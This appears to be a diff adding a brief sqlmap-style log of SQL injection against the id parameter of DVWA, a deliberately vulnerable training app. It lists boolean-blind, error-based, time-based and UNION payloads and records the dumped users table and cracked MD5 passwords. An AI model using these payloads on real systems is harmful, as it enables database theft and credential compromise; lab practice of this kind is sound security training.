@@ -1,0 +1,6 @@
+Parameter: id (GET)  -- DVWA SQL Injection module, security=low
+  Type: boolean-based blind -> id=1' OR NOT 6685=6685#
+  Type: error-based (EXTRACTVALUE) -> id=1' AND EXTRACTVALUE(9363,CONCAT(...))
+  Type: time-based blind -> id=1' AND (SELECT 5393 FROM (SELECT(SLEEP(5)))...)
+  Type: UNION query (2 cols) -> id=1' UNION ALL SELECT NULL,CONCAT(...)#
+Result: dumped dvwa.users (5 rows); unsalted MD5 hashes cracked: password, abc123, charley, letmein
